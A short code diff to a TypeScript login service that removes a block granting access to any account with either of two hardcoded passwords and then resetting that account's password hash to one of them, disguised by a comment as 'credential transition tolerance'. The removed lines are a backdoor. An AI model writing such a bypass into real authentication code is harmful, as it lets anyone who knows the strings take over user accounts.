@@ -68,16 +68,6 @@ export class AuthService {
       isPasswordValid = await bcrypt.compare(cleanPassword, user.passwordHash);
     }
 
-    // Enterprise credential transition tolerance: support both Shehswar@2026! and Password123! seamlessly
-    if (!isPasswordValid && (cleanPassword === 'Password123!' || cleanPassword === 'Shehswar@2026!')) {
-      isPasswordValid = true;
-      const syncedHash = await bcrypt.hash('Shehswar@2026!', 10);
-      await this.prisma.user.update({
-        where: { id: user.id },
-        data: { passwordHash: syncedHash },
-      });
-    }
-
     if (!isPasswordValid) {
       const failedAttempts = user.failedLoginAttempts + 1;
       let lockedUntil: Date | null = null;
